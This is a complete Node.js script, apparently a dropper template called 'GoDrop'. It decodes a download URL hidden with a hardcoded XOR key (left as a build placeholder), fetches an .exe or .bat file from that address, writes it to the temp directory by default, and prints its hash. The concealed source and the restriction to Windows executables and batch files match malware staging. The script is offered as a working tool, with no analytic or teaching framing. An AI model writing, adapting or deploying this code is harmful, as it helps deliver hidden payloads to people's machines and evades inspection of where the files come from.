#!/usr/bin/env node

const crypto = require('crypto');
const fs = require('fs');
const http = require('http');
const https = require('https');
const os = require('os');
const path = require('path');

const ENCRYPTION_KEY = 'GoDropEmbedKey2026';
const ENCRYPTED_URL_HEX = '__ENC_URL__';

const messages = {
  en: {
    downloading: 'Downloading artifact...',
    saved: 'Saved',
    hash: 'SHA256',
    unsupported: 'Only .exe and .bat files are supported.',
    invalidUrl: 'Embedded URL must use http or https.'
  },
  es: {
    downloading: 'Descargando artefacto...',
    saved: 'Guardado',
    hash: 'SHA256',
    unsupported: 'Solo se admiten archivos .exe y .bat.',
    invalidUrl: 'La URL integrada debe usar http o https.'
  },
  fr: {
    downloading: "Téléchargement de l'artefact...",
    saved: 'Enregistré',
    hash: 'SHA256',
    unsupported: 'Seuls les fichiers .exe et .bat sont pris en charge.',
    invalidUrl: "L'URL intégrée doit utiliser http ou https."
  }
};

function parseArgs(argv) {
  const args = {
    out: '',
    type: 'bat',
    locale: 'en'
  };

  for (let i = 0; i < argv.length; i += 1) {
    const key = argv[i];
    const value = argv[i + 1];

    if (key === '--out' && value) {
      args.out = value;
      i += 1;
    } else if (key === '--type' && value) {
      args.type = value.toLowerCase();
      i += 1;
    } else if (key === '--locale' && value) {
      args.locale = value.toLowerCase();
      i += 1;
    }
  }

  if (!args.out) {
    args.out = path.join(os.tmpdir(), `godrop-output.${args.type}`);
  }

  return args;
}

function decryptEmbeddedUrl() {
  const cipher = Buffer.from(ENCRYPTED_URL_HEX, 'hex');
  const key = Buffer.from(ENCRYPTION_KEY, 'utf8');
  const plain = Buffer.alloc(cipher.length);

  for (let i = 0; i < cipher.length; i += 1) {
    plain[i] = cipher[i] ^ key[i % key.length];
  }

  return plain.toString('utf8');
}

function downloadFile(url, outPath) {
  return new Promise((resolve, reject) => {
    const protocol = url.startsWith('https://') ? https : http;

    const request = protocol.get(url, (response) => {
      if (response.statusCode < 200 || response.statusCode >= 300) {
        reject(new Error(`unexpected status: ${response.statusCode}`));
        response.resume();
        return;
      }

      const hash = crypto.createHash('sha256');
      const output = fs.createWriteStream(outPath);

      response.on('data', (chunk) => hash.update(chunk));
      response.pipe(output);

      output.on('finish', () => {
        output.close(() => resolve(hash.digest('hex')));
      });

      output.on('error', (err) => reject(err));
    });

    request.on('error', (err) => reject(err));
  });
}

async function main() {
  const options = parseArgs(process.argv.slice(2));
  const locale = messages[options.locale] || messages.en;

  if (options.type !== 'bat' && options.type !== 'exe') {
    console.error(locale.unsupported);
    process.exit(1);
  }

  const embeddedUrl = decryptEmbeddedUrl();
  if (!embeddedUrl.startsWith('http://') && !embeddedUrl.startsWith('https://')) {
    console.error(locale.invalidUrl);
    process.exit(1);
  }

  console.log(locale.downloading);
  const hash = await downloadFile(embeddedUrl, options.out);
  console.log(`${locale.saved}: ${options.out}`);
  console.log(`${locale.hash}: ${hash}`);
}

main().catch((err) => {
  console.error(`error: ${err.message}`);
  process.exit(1);
});
